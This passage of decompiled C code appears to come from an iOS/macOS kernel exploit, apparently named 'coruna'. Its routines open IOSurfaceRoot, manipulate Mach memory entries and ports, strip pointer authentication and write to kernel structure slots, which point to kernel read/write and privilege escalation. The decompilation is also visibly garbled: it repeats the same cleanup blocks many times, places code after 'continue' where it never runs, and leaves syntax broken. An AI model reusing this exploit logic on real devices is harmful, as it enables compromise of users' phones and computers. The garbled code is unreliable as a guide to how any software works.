                                    serial = *ptr;
                                  }
                                  else {
                                    kind = coruna_kernel600c_via_pacia_12_10(*ptr,cache_20);
                                    serial = *ptr;
                                    if ((kind < *(unsigned long *)(&k_kernel_slot_19e8 + serial)) ||
                                       ((kind & 3) != 0 ||
                                        *(unsigned long *)(&k_kernel_slot_19f0 + serial) <= kind)) {
                                      err = 0;
                                      bootargs = 0;
                                    }
                                    else {
                                      err = err + 1;
                                      if (err == 7) {
                                        *(unsigned long *)(serial + 0x220) = bootargs;
                                        _close(status);
                                        serial = *(long *)(buf + 0xa0);
                                        if (serial == 0) {
                                          copy = (uint8_t *)coruna_kernel600c_residual_218(buf);
                                          {
                                            if ((int)cache != -1) {
                                            _close((int)cache);
                                            }
                                            version = cache;
                                            if (cache != 0xffffffff) {
                                            version = _close(cache);
                                            }
                                            str = (uint8_t *)(unsigned long)version;
                                            *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                            serial = *ptr;
                                            *(uint64_t *)(serial + 0x30) = 0;
                                            *(uint64_t *)(serial + 0x50) = 0;
                                            status = (int)copy;
                                            {
                                            {
                                            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                            return;
                                            }
                                            ___stack_chk_fail(str);
                                            }
                                            break;
                                            }
                                            flags = flags + 1;
                                          }
                                          serial = *(long *)(buf + 0xa0);
                                        }
                                        status = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[
                                                  0x95],ptr,0);
                                        copy = &k_kernel_rodata_word_3f002;
                                        {
                                          if ((int)cache != -1) {
                                          _close((int)cache);
                                          }
                                          version = cache;
                                          if (cache != 0xffffffff) {
                                          version = _close(cache);
                                          }
                                          str = (uint8_t *)(unsigned long)version;
                                          *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                          serial = *ptr;
                                          *(uint64_t *)(serial + 0x30) = 0;
                                          *(uint64_t *)(serial + 0x50) = 0;
                                          status = (int)copy;
                                          {
                                          {
                                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                          return;
                                          }
                                          ___stack_chk_fail(str);
                                          }
                                          break;
                                          }
                                          flags = flags + 1;
                                        }
                                        serial = *ptr;
                                        *(uint64_t *)(&k_kernel_slot_19d0 + serial) = *ptr;
                                        copy = (uint8_t *)
                                                  coruna_kernel600c_via_fileport_makeport(serial,*(uint32_t *)
                                                                       (&k_kernel_slot_1930 + serial));
                                        if (((int)copy != 0) ||
                                           (str = (uint8_t *)
                                                     coruna_kernel600c_via_fileport_makeport(*ptr,*(uint32_t *)
                                                                            (&k_kernel_slot_1934 +
                                                                            *ptr)),
                                           {
                                             if ((int)cache != -1) {
                                             _close((int)cache);
                                             }
                                             version = cache;
                                             if (cache != 0xffffffff) {
                                             version = _close(cache);
                                             }
                                             str = (uint8_t *)(unsigned long)version;
                                             *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                             serial = *ptr;
                                             *(uint64_t *)(serial + 0x30) = 0;
                                             *(uint64_t *)(serial + 0x50) = 0;
                                             status = (int)copy;
                                             {
                                             {
                                             if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                             return;
                                             }
                                             ___stack_chk_fail(str);
                                             }
                                             break;
                                             }
                                             flags = flags + 1;
                                           }
                                        {
                                          serial = *ptr;
                                          *(uint64_t *)(serial + 0x30) = 0;
                                          *(uint64_t *)(serial + 0x50) = 0;
                                          status = (int)copy;
                                          {
                                          {
                                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                          return;
                                          }
                                          ___stack_chk_fail(str);
                                          }
                                          break;
                                          }
                                          flags = flags + 1;
                                        }
                                      }
                                    }
                                  }
                                  thread_attr = thread_attr + (long)*(int *)(serial + 0x168);
                                  copy = (uint8_t *)0xad011;
                                } while (thread_attr < type_id);
                              }
                            }
                            _close(status);
                          }
                          {
                            if ((int)cache != -1) {
                            _close((int)cache);
                            }
                            version = cache;
                            if (cache != 0xffffffff) {
                            version = _close(cache);
                            }
                            str = (uint8_t *)(unsigned long)version;
                            *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                            serial = *ptr;
                            *(uint64_t *)(serial + 0x30) = 0;
                            *(uint64_t *)(serial + 0x50) = 0;
                            status = (int)copy;
                            {
                            {
                            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                            return;
                            }
                            ___stack_chk_fail(str);
                            }
                            break;
                            }
                            flags = flags + 1;
                          }
                        }
                      }
                      {
                        serial = *ptr;
                        *(uint64_t *)(serial + 0x30) = 0;
                        *(uint64_t *)(serial + 0x50) = 0;
                        status = (int)copy;
                        {
                        {
                        if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                        return;
                        }
                        ___stack_chk_fail(str);
                        }
                        break;
                        }
                        flags = flags + 1;
                      }
                    }
                  }
                }
              }
            }
          }
check_ok:
          if ((int)cache != -1) {
            _close((int)cache);
          }
          version = cache;
          if (cache != 0xffffffff) {
            version = _close(cache);
          }
          str = (uint8_t *)(unsigned long)version;
          *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        *(uint32_t **)(data + 0x750) = buf;
        *(void (**)(data + 0xc) = coruna_kernel600c_residual_217;
        *(uint32_t **)(data + 0x14) = buf;
        serial = *(long *)(buf + 0xa0);
        if (serial == 0) {
          str = (uint8_t *)coruna_kernel600c_residual_218(buf);
          copy = str;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
          serial = *(long *)(buf + 0xa0);
        }
        str = (uint8_t *)coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[0x95],ptr,0);
        if ((int)str == 0) {
          *(uint64_t *)(&k_kernel_slot_19d0 + *(long *)(buf + 2)) = *(uint64_t *)(buf + 0xa2);
          str = (uint8_t *)coruna_open_iosurface_root_aae0(buf);
          copy = str;
          if ((int)str == 0) {
            serial = *ptr;
            if (0x44a < *(unsigned long *)(serial + 0x158) >> 0x2b) {
              status = 0;
              *(uint64_t *)(serial + 0x30) = 0;
              *(uint64_t *)(serial + 0x50) = 0;
            }
            region = 0;
            frame = 0;
            work = 0;
            url_buf = 0;
            json_buf = 0;
            sa_new = 0;
            path_buf = 0;
            stack_guard = 0;
            action = (uint32_t *)0x0;
            size = *(vm_size_t *)k_kernel_vm_page_size_slot;
            serial_buf[1] = 0x80;
            base = 0x100;
            if (*(int *)(serial + 0x140) < 0x2258) {
              base = 0x118;
            }
            ctx_val = 0x108;
            if (*(int *)(serial + 0x140) < 0x2258) {
              ctx_val = 0x120;
            }
            handle = _IOServiceMatching("IOSurfaceRoot");
            copy = (uint8_t *)0xad022;
            if (handle != 0) {
              tag = _IOServiceGetMatchingService(u,handle);
              copy = (uint8_t *)0xad022;
              if (1 < (int)tag + 1U) {
                status = _IOServiceOpen(tag,*(uint32_t *)k_kernel_mach_task_self_slot,0,
                                       &region);
                copy = (uint8_t *)0xad022;
                if ((status == 0) && (copy = (uint8_t *)0xad022, 1 < region + 1U)) {
                  scratch = 0x2800f;
                  handle = coruna_ret_stub_8(serial);
                  if (handle == 0) {
                    copy = (uint8_t *)0x2800e;
                  }
                  else {
                    addr = coruna_kernel600c_via_pacia_5(serial,handle);
                    if (addr != 0) {
                      status = 8;
next:
                      copy = (uint8_t *)coruna_dlopen_iosurface_c870(serial,region,&tmp_buf);
                      continue;
                      err = coruna_ret_stub_6(serial,addr + ctx_val,8,&cache_20);
                      version = tmp_buf;
                      if (err != 0) {
                        if (cache_20 <= tmp_buf) {
found:
                          copy = (uint8_t *)0x28011;
                          continue;
                        }
                        err = coruna_kernel600c_residual_257(serial,addr + base,&cache);
                        copy = (uint8_t *)0x2800f;
                        continue;
                        off = coruna_pacia(serial,cache);
                        if (off == 0) {
invalid:
                          copy = (uint8_t *)0x28026;
                          continue;
                        }
                        err = coruna_kernel600c_residual_257(serial,cache + (version << 3),&work);
                        copy = (uint8_t *)0x2800f;
                        continue;
                        off = coruna_pacia(serial,work);
                        copy = (uint8_t *)0x28026;
                        continue;
                        err = coruna_kernel600c_residual_257(serial,work + 0x40,&frame);
                        copy = (uint8_t *)0x2800f;
                        continue;
                        off = coruna_pacia(serial,frame);
                        copy = (uint8_t *)0x28026;
                        continue;
                        if ((unsigned long)*(uint *)(serial + 0x180) -
                            (*(unsigned long *)(serial + 0x188) & frame) < 0x500) {
                          copy = (uint8_t *)0xad011;
                          status = status + -1;
                          continue;
                          goto next;
                        }
                        status = coruna_ret_stub_6(serial,addr + 0x99,1,&block_ctx);
                        copy = (uint8_t *)0x2800f;
                        continue;
                        copy = (uint8_t *)0x28011;
                        continue;
                        status = coruna_kernel600c_residual_257(serial,addr + 0x88,&cache_21);
                        if (status != 0) {
                          base = coruna_pacia(serial,cache_21);
                          copy = (uint8_t *)0x28026;
                          continue;
                          status = coruna_call_mach_vm_machine_attribute_1d4f8(serial,cache_21 + 8,0);
                          if (status != 0) {
                            if (0x2257ffffffffff < *(unsigned long *)(serial + 0x158)) {
                              plist = plist & 0xffffff00;
                              status = coruna_ret_stub_6(serial,addr + 0x11f,1,&plist);
                              if (status != 0) {
                                if ((plist & 0xff) == 0) goto again;
                                if ((plist & 0xff) == 1) {
                                  plist = plist & 0xffffff00;
                                  status = coruna_ret_stub_7(serial,addr + 0x11f,&plist,1);
                                  if (status != 0) goto again;
                                  scratch = 0x28010;
                                }
                                else {
                                  scratch = 0x28011;
                                }
                              }
                              copy = (uint8_t *)(unsigned long)scratch;
                              continue;
                            }
again:
                            block_ctx = '@';
                            status = coruna_ret_stub_7(serial,addr + 0x99,&block_ctx,1);
                            if (status != 0) {
                              copy = (uint8_t *)coruna_memmem(buf,frame,&json_buf);
                              kind = frame;
                              type_id = json_buf;
                              continue;
                              if (json_buf == 0) {
                                copy = &k_kernel_slot_1001;
                                continue;
                              }
                              type_id_8 = *(unsigned long *)(serial + 0x188);
                              base = coruna_vm_deallocate_2a1cc(serial,serial_buf + 1);
                              if (base == 0) {
                                copy = (uint8_t *)0xad009;
                                continue;
                              }
                              sa_saved = *(vm_size_t *)k_kernel_vm_page_size_slot;
                              port = _mach_make_memory_entry
                                                (*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                 &sa_saved,0,0x20003,&stack_guard,0);
                              if ((port != 0) ||
                                 (port = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                  (vm_address_t *)&action,size,0,1,stack_guard,0,0,
                                                  3,2,(vm_inherit_t)handle), port != 0)) {
exit_ok:
                                copy = (uint8_t *)(unsigned long)(port | 0x80000000);
                                continue;
                              }
                              *action = 0;
                              _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                             (vm_address_t)action,size);
                              ctx_val = coruna_kernel600c_via_kernel600c_via_pacia_5(serial,stack_guard);
                              if (ctx_val == 0) goto parse_ok;
                              status = coruna_kernel600c_residual_257(serial,ctx_val + (unsigned long)(4 < *(long *)(serial + 
                                                  0x158) + 0xffe0abe700000000U >> 0x20) * 0x10,
                                                  &path_buf);
                              copy = (uint8_t *)0x2800f;
                              continue;
                              ctx_val = coruna_pacia(serial,path_buf);
                              copy = (uint8_t *)0x28026;
                              continue;
                              if (0x1c1a < *(int *)(serial + 0x140)) {
                                status = coruna_kernel600c_residual_257(serial,path_buf + 0x20,&sa_new);
                                if (status != 0) {
                                  ctx_val = coruna_pacia(serial,sa_new);
                                  if (ctx_val != 0) {
                                    status = coruna_kernel600c_via_kernel600c_via_kernel600c_via_thread_get_state_2(serial,sa_new + 0x38,&url_buf);
                                    copy = (uint8_t *)0x2800f;
                                    continue;
                                    if (0x1f542301dfffff < *(unsigned long *)(serial + 0x158)) {
                                      url_buf = coruna_kernel600c_residual_259(serial,url_buf >> 0x20);
                                    }
                                    ctx_val = coruna_pacia(serial,url_buf);
                                    size = url_buf;
                                    ctx_val = coruna_kernel600c_via_pacia_12_20(serial,0,&plist);
                                    copy = (uint8_t *)0x28010;
                                    continue;
                                  }
                                  copy = (uint8_t *)0x28026;
                                  continue;
                                }
                                copy = (uint8_t *)0x2800f;
                                continue;
                              }
                              url_buf = path_buf;
load_ok:
                              size = url_buf;
                              ctx_val = coruna_kernel600c_via_pacia_12_20(serial,0,&plist);
                              copy = (uint8_t *)0x28010;
                              continue;
                              cache_22[1] = 0;
                              cache_22[0] = 0;
                              bootargs = 0;
                              cache_23 = 0;
                              cache_22[2] = 0;
                              cache_25 = 0;
                              if (*(unsigned long *)k_kernel_vm_page_size_slot != 0) {
                                cache_25 = (type_id & (type_id_8 ^ 0xffffffffffffffff)) /
                                           *(unsigned long *)k_kernel_vm_page_size_slot;
                              }
                              cache_24 = 0x140;
                              thread_attr = (uint32_t)(size - ctx_val >> ((unsigned long)plist & 0x3f));
                              host_info = 0x2000000;
                              status = coruna_ret_stub_7(serial,base,cache_22,0x38);
                              copy = (uint8_t *)0x28010;
                              if ((status == 0) ||
                                 (status = coruna_call_mach_vm_machine_attribute_1d4f8(serial,url_buf + 0x20,base), status == 0))
                              continue;
                              status = coruna_kernel600c_via_kernel600c_via_kernel600c_via_thread_get_state(serial,url_buf + 0x74,serial_buf);
                              copy = (uint8_t *)0x2800f;
                              continue;
                              copy = (uint8_t *)0x28011;
                              continue;
                              status = coruna_mach_vm_machine_attribute(serial,url_buf + 0x74,serial_buf[0] | 0x1000);
                              if (status != 0) {
                                port = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                (vm_address_t *)&action,size,0,1,stack_guard,0,0,3,
                                                2,(vm_inherit_t)handle);
                                copy = (uint8_t *)(unsigned long)(port | 0x80000000);
                                continue;
                                *(int *)(serial + 0xe8) = region;
                                *(unsigned long *)(serial + 0xf0) = frame;
                                *(uint32_t **)(serial + 0xf8) = action;
                                *(vm_size_t *)(serial + 0x100) = size;
                                *(unsigned long *)(serial + 0x108) = kind & type_id_8;
                                *(uint *)(serial + 0x110) = version;
                                *(mem_entry_name_port_t *)(serial + 0x114) = stack_guard;
                                copy = (uint8_t *)0x28001;
                                if (((region + 1U < 2) || (action == (uint32_t *)0x0)) ||
                                   continue;
                                status = coruna_kernel600c_via_ret_stub_6_3(serial,handle,0x10);
                                if (status != 0) {
                                  str = (uint8_t *)coruna_vm_deallocate(obj);
                                  copy = (uint8_t *)0x0;
                                  {
                                    serial = *ptr;
                                    *(uint64_t *)(serial + 0x30) = 0;
                                    *(uint64_t *)(serial + 0x50) = 0;
                                    status = (int)copy;
                                    {
                                    {
                                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                    return;
                                    }
                                    ___stack_chk_fail(str);
                                    }
                                    break;
                                    }
                                    flags = flags + 1;
                                  }
                                }
                              }
                            }
                          }
load_ok_15:
                          copy = (uint8_t *)0x28010;
                          continue;
                        }
                      }
nomem:
                      copy = (uint8_t *)0x2800f;
                      continue;
                    }
parse_ok:
                    copy = (uint8_t *)0x28025;
                  }
                }
              }
            }
retry:
            str = (uint8_t *)coruna_vm_deallocate(obj);
            *(uint32_t *)(*ptr + 0xe8) = 0;
          }
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        serial = *ptr;
        status = 0x3f002;
skip:
        *(uint64_t *)(serial + 0x30) = 0;
        *(uint64_t *)(serial + 0x50) = 0;
load_ok_16:
        {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
        }
        break;
      }
fail:
      serial = *ptr;
      *(uint64_t *)(serial + 0x30) = 0;
      *(uint64_t *)(serial + 0x50) = 0;
      status = (int)copy;
      {
        {
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
        return;
        }
        ___stack_chk_fail(str);
        }
        break;
      }
      flags = flags + 1;
    } while (flags != 5);
  }
  str = (uint8_t *)coruna_pthread_from_mach_thread_np(buf);
load_ok_17:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
    return;
  }
  ___stack_chk_fail(str);
}





uint64_t coruna_pthread_from_mach_thread_np(void *ctx)
{
  int err;
  pthread_t p_Var2;
  unsigned long u;
  
  if (ctx != (void *)0x0) {
    u = *(unsigned long *)(*(uint **)((long)ctx + 8) + 0x56);
    if ((0x1f530f027fffff < u) &&
       ((**(uint **)((long)ctx + 8) & 0x5584001) != 0 || 0x1f5418ffffffff < u)) {
      if (1 < *(mach_port_name_t *)((long)ctx + 0x680) + 1) {
        _mach_port_deallocate
                  (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                   *(mach_port_name_t *)((long)ctx + 0x680));
      }
      *(uint32_t *)((long)ctx + 0x680) = 0;
      if (1 < *(int *)((long)ctx + 0x67c) + 1U) {
        _IOObjectRelease();
      }
      *(uint32_t *)((long)ctx + 0x67c) = 0;
      err = _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x6d0));
      if (err != 0) {
        return 0xad009;
      }
      *(uint64_t *)((long)ctx + 0x6f8) = 0;
      *(uint64_t *)((long)ctx + 0x6f0) = 0;
      *(uint64_t *)((long)ctx + 0x708) = 0;
      *(uint64_t *)((long)ctx + 0x700) = 0;
      *(uint64_t *)((long)ctx + 0x6d8) = 0;
      ((pthread_mutex_t *)((long)ctx + 0x6d0))->__sig = 0;
      *(uint64_t *)((long)ctx + 0x6e8) = 0;
      *(uint64_t *)((long)ctx + 0x6e0) = 0;
    }
    *(uint64_t *)((long)ctx + 0x2d8) = 0;
    if (*(char *)((long)ctx + 0x634) != '\0') {
      p_Var2 = _pthread_from_mach_thread_np(*(mach_port_t *)((long)ctx + 0x300));
      _thread_resume(*(thread_act_t *)((long)ctx + 0x300));
      _pthread_join(p_Var2,(void **)0x0);
    }
    if (*(void **)((long)ctx + 0x2b8) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x2b8));
      *(uint64_t *)((long)ctx + 0x2b8) = 0;
    }
    if (*(void **)((long)ctx + 0x2c0) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x2c0));
      *(uint64_t *)((long)ctx + 0x2c0) = 0;
    }
    _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x638));
    *(uint64_t *)((long)ctx + 0x640) = 0;
    ((pthread_mutex_t *)((long)ctx + 0x638))->__sig = 0;
    *(uint64_t *)((long)ctx + 0x650) = 0;
    *(uint64_t *)((long)ctx + 0x648) = 0;
    *(uint64_t *)((long)ctx + 0x660) = 0;
    *(uint64_t *)((long)ctx + 0x658) = 0;
    *(uint64_t *)((long)ctx + 0x670) = 0;
    *(uint64_t *)((long)ctx + 0x668) = 0;
    coruna_vm_deallocate_93b0((long)ctx + 0x10);
    coruna_pthread_mutex_lock((long)ctx + 0xf0);
    *(uint64_t *)(&k_kernel_slot_1d40 + *(long *)((long)ctx + 8)) = 0;
    _free(ctx);
  }
  return 0;
}





uint8_t * coruna_mach_port_deallocate(long handle)
{
  int err;
  uint u;
  uint8_t *ptr;
  uint8_t *buf;
  long handle;
  void *ptr;
  mach_port_name_t scratch;
  vm_address_t bootargs;
  vm_address_t thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  ptr = *(void **)(&k_kernel_slot_1d40 + handle);
  if (ptr == (void *)0x0) {
    ptr = &k_kernel_slot_1001;
  }
  else {
    err = coruna_mach_port_deallocate_137e4(handle,0x11,0x4000,&thread_attr);
    if ((err == 0) ||
       (ptr = (uint8_t *)coruna_mach_make_memory_entry(handle,0x11,0x4000,0,&thread_attr), (int)ptr == 0)) {
      handle = 0;
      do {
        if (*(int *)(thread_attr + handle) == 8) {
code_r0x00009c18:
          ptr = k_kernel_mach_task_self_slot;
          u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,0x4000);
          if (u != 0) {
fail:
            return (uint8_t *)(unsigned long)(u | 0x80000000);
          }
          err = coruna_mach_port_deallocate_137e4(handle,0x12,*(uint64_t *)((long)ptr + 0x110),&bootargs);
          if (err == 0) {
            u = _vm_deallocate(*(vm_map_t *)ptr,bootargs,*(vm_size_t *)((long)ptr + 0x110)
                                  );
            return (uint8_t *)(unsigned long)(u | 0x80000000);
          }
          else {
            buf = (uint8_t *)
                     coruna_mach_make_memory_entry(handle,0x12,*(uint64_t *)((long)ptr + 0x110),
                                  *(uint64_t *)((long)ptr + 0x170),0);
            if ((int)buf != 0) {
              return buf;
            }
          }
          if ((*(long *)((long)ptr + 0x6c0) != 0) && (1 < *(int *)((long)ptr + 0x680) + 1U)) {
            scratch = 0;
            err = coruna_ioconnectcallstructmethod(handle,&scratch);
            if (err == 0) {
              u = _mach_port_deallocate(*(ipc_space_t *)ptr,scratch);
              return (uint8_t *)(unsigned long)(u | 0x80000000);
            }
            else {
              ptr = (uint8_t *)coruna_mach_port_deallocate_14118(handle,0x13,*(uint32_t *)((long)ptr + 0x680))
              ;
              if ((int)ptr != 0) {
                return ptr;
              }
            }
          }
          return (uint8_t *)0x0;
        }
        if (*(int *)(thread_attr + handle) == 0) {
          _memcpy((void *)(thread_attr + handle),ptr,0x710);
          {
            ptr = k_kernel_mach_task_self_slot;
            u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,0x4000);
            if (u != 0) {
            fail:
            return (uint8_t *)(unsigned long)(u | 0x80000000);
            }
            err = coruna_mach_port_deallocate_137e4(handle,0x12,*(uint64_t *)((long)ptr + 0x110),&bootargs);
            if (err == 0) {
            u = _vm_deallocate(*(vm_map_t *)ptr,bootargs,*(vm_size_t *)((long)ptr + 0x110)
            );
            return (uint8_t *)(unsigned long)(u | 0x80000000);
            }
            else {
            buf = (uint8_t *)
            coruna_mach_make_memory_entry(handle,0x12,*(uint64_t *)((long)ptr + 0x110),
            *(uint64_t *)((long)ptr + 0x170),0);
            if ((int)buf != 0) {
            return buf;
            }
            }
            if ((*(long *)((long)ptr + 0x6c0) != 0) && (1 < *(int *)((long)ptr + 0x680) + 1U)) {
            scratch = 0;
            err = coruna_ioconnectcallstructmethod(handle,&scratch);
            if (err == 0) {
            u = _mach_port_deallocate(*(ipc_space_t *)ptr,scratch);
            return (uint8_t *)(unsigned long)(u | 0x80000000);
            }
            else {
            ptr = (uint8_t *)coruna_mach_port_deallocate_14118(handle,0x13,*(uint32_t *)((long)ptr + 0x680))
            ;
            if ((int)ptr != 0) {
            return ptr;
            }
            }
            }
            return (uint8_t *)0x0;
          }
        }
        handle = handle + 0x1000;
      } while (handle != 0x4000);
      ptr = (uint8_t *)0xad009;
    }
  }
  return ptr;
}





unsigned long coruna_ioconnectcallstructmethod(uint64_t arg,mach_port_name_t *val)

{
  uint type_id_21;
  unsigned long type_id_17;
  unsigned long u;
  uint64_t cache_51;
  mach_port_name_t cache_52;
  uint64_t cache_28;
  uint64_t cache_54;
  uint64_t cache_55;
  uint64_t cache_56;
  uint64_t cache_53;
  uint64_t cache_57;
  uint64_t cache_58;
  uint64_t cache_59;
  long cache_54;
  
  cache_54 = *(long *)k_kernel_stack_chk_guard_slot;
  cache_52 = 0;
  cache_51 = 0x40;
  type_id_17 = coruna_mach_port_mod_refs(arg,0x13,&cache_52);
  u = type_id_17;
  if ((int)type_id_17 == 0) {
    cache_57 = 0;
    cache_53 = 0;
    cache_59 = 0;
    cache_58 = 0;
    cache_54 = 0;
    cache_28 = 0;
    cache_56 = 0;
    cache_55 = 0;
    type_id_17 = _IOConnectCallStructMethod(cache_52,1,0,0,&cache_28,&cache_51);
    if ((uint)type_id_17 == 0) {
      u = 0;
      *val = cache_52;
      cache_52 = 0;
    }
    else {
      u = (unsigned long)((uint)type_id_17 | 0x80000000);
    }
  }
  if (1 < cache_52 + 1) {
    type_id_21 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_52);
    type_id_17 = (unsigned long)type_id_21;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_54) {
    return u;
  }
  ___stack_chk_fail(type_id_17);
}





unsigned long coruna_semaphore_create(long arg,uint32_t *val)

{
  long handle;
  int n;
  uint u;
  void *block;
  unsigned long version;
  uint64_t type_id_13;
  uint64_t port;
  uint64_t type_id_14;
  long serial_10;
  long cache_55;
  
  cache_55 = 0;
  *val = 0;
  n = coruna_mach_port_deallocate_137e4(arg,0x11,0x4000,&cache_55);
  handle = cache_55;
  if (n == 0) {
    serial_10 = 0;
    do {
      if (*(int *)(cache_55 + serial_10) == 8) {
        block = _calloc(1,0x710);
        if (block == (void *)0x0) {
          return 0xad009;
        }
        _memcpy(block,(void *)(handle + serial_10),0x6d0);
        *(uint64_t *)((long)block + 0x2b8) = 0;
        *(uint32_t *)((long)block + 0x2c8) = 0;
        *(uint8_t *)((long)block + 0x2cc) = 0;
        *(uint32_t *)((long)block + 0x2d0) = 0;
        *(uint64_t *)((long)block + 0x2d8) = 0;
        *(uint32_t *)((long)block + 0x2e8) = 0;
        *(uint8_t *)((long)block + 0x634) = 0;
        *(uint64_t *)((long)block + 0x67c) = 0;
        *(uint32_t *)((long)block + 0x6c8) = 0;
        *(uint64_t *)((long)block + 0x6d8) = 0;
        *(uint64_t *)((long)block + 0x6d0) = 0;
        *(uint64_t *)((long)block + 0x6e8) = 0;
        *(uint64_t *)((long)block + 0x6e0) = 0;
        *(uint64_t *)((long)block + 0x6f8) = 0;
        *(uint64_t *)((long)block + 0x6f0) = 0;
        *(uint64_t *)((long)block + 0x708) = 0;
        *(uint64_t *)((long)block + 0x700) = 0;
        *(uint64_t *)((long)block + 0x220) = 0;
        *(uint64_t *)((long)block + 0x218) = 0;
        *(uint64_t *)((long)block + 0x230) = 0;
        *(uint64_t *)((long)block + 0x228) = 0;
        *(uint64_t *)((long)block + 0x23c) = 0;
        *(uint64_t *)((long)block + 0x234) = 0;
        *(uint64_t *)((long)block + 0x2a8) = 0;
        *(uint64_t *)((long)block + 0x2a0) = 0;
        *(uint64_t *)((long)block + 0x2f8) = 0;
        *(uint64_t *)((long)block + 0x2f0) = 0;
        *(uint64_t *)((long)block + 0x2fd) = 0;
        *(uint32_t *)((long)block + 0x677) = 0;
        *(uint64_t *)((long)block + 0x660) = 0;
        *(uint64_t *)((long)block + 0x658) = 0;
        *(uint64_t *)((long)block + 0x670) = 0;
        *(uint64_t *)((long)block + 0x668) = 0;
        *(uint64_t *)((long)block + 0x640) = 0;
        *(uint64_t *)((long)block + 0x638) = 0;
        *(uint64_t *)((long)block + 0x650) = 0;
        *(uint64_t *)((long)block + 0x648) = 0;
        *(uint64_t *)((long)block + 0x690) = 0;
        *(uint64_t *)((long)block + 0x688) = 0;
        *(uint64_t *)((long)block + 0x6a0) = 0;
        *(uint64_t *)((long)block + 0x698) = 0;
        type_id_13 = *(uint64_t *)((long)block + 0x110);
        port = *(uint64_t *)((long)block + 0x170);
        type_id_14 = *(uint64_t *)((long)block + 0x1a8);
        *(uint64_t *)((long)block + 0x120) = 0;
        *(uint64_t *)((long)block + 0x118) = 0;
        *(uint64_t *)((long)block + 0x130) = 0;
        *(uint64_t *)((long)block + 0x128) = 0;
        *(uint64_t *)((long)block + 0x140) = 0;
        *(uint64_t *)((long)block + 0x138) = 0;
        *(uint64_t *)((long)block + 0x150) = 0;
        *(uint64_t *)((long)block + 0x148) = 0;
        *(uint64_t *)((long)block + 0x160) = 0;
        *(uint64_t *)((long)block + 0x158) = 0;
        *(uint64_t *)((long)block + 0x180) = 0;
        *(uint64_t *)((long)block + 0x178) = 0;
        *(uint64_t *)((long)block + 400) = 0;
        *(uint64_t *)((long)block + 0x188) = 0;
        *(uint64_t *)((long)block + 0x1a0) = 0;
        *(uint64_t *)((long)block + 0x198) = 0;
        *(uint64_t *)((long)block + 0x1c0) = 0;
        *(uint64_t *)((long)block + 0x1b8) = 0;
        *(uint64_t *)((long)block + 0x1d0) = 0;
        *(uint64_t *)((long)block + 0x1c8) = 0;
        *(uint64_t *)((long)block + 0x1e0) = 0;
        *(uint64_t *)((long)block + 0x1d8) = 0;
        *(uint64_t *)((long)block + 0x1f0) = 0;
        *(uint64_t *)((long)block + 0x1e8) = 0;
        *(uint64_t *)((long)block + 0x200) = 0;
        *(uint64_t *)((long)block + 0x1f8) = 0;
        *(uint64_t *)((long)block + 0x210) = 0;
        *(uint64_t *)((long)block + 0x208) = 0;
        *(uint64_t *)((long)block + 0x110) = 0;
        *(uint64_t *)((long)block + 0x108) = 0;
        *(uint64_t *)((long)block + 0x170) = 0;
        *(uint64_t *)((long)block + 0x168) = 0;
        *(uint64_t *)((long)block + 0x1b0) = 0;
        *(uint64_t *)((long)block + 0x1a8) = 0;
        *(uint64_t *)((long)block + 0x110) = type_id_13;
        *(uint64_t *)((long)block + 0x170) = port;
        *(uint64_t *)((long)block + 0x1a8) = type_id_14;
        *(uint64_t *)((long)block + 0x1c8) = 0;
        *(uint64_t *)((long)block + 0x1c0) = 0;
        *(uint64_t *)((long)block + 0x1d8) = 0;
        *(uint64_t *)((long)block + 0x1d0) = 0;
